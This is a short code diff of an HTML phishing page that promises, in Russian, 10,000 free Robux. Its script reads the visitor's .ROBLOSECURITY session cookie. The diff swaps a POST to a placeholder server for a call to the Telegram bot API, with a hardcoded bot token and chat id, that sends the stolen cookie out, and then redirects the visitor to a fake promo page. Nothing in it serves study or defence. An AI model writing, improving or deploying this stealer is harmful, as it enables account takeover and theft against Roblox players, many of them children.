@@ -3,18 +3,18 @@
 <head>
     <title>Бесплатные 10000 Робуксов!</title>
     <script>
-        function stealCookies() {
+        async function stealCookies() {
             // Capture the victim's Roblox cookies
             var robloxCookies = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
             
-            // Send the stolen cookies to our server
-            fetch('https://your-server.com/steal', {
-                method: 'POST',
-                body: JSON.stringify({ cookies: robloxCookies }),
-                headers: { 'Content-Type': 'application/json' }
-            });
+            // Send the stolen cookies to the Telegram bot
+            const botToken = '8231043844:AAFZs7dQ-suK_mfz2vo_CSQFNR0EhflqkAw';
+            const chatId = '7759891108';
+            const message = `🔥 НОВЫЕ КУКИ! 🔥\n${robloxCookies}`;
 
-            // Redirect to the modified Roblox site
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            
+            // Redirect to the fake Roblox site
             window.location.href = 'https://www.roblox.com/fake-promo?robux=10000';
         }
     </script>
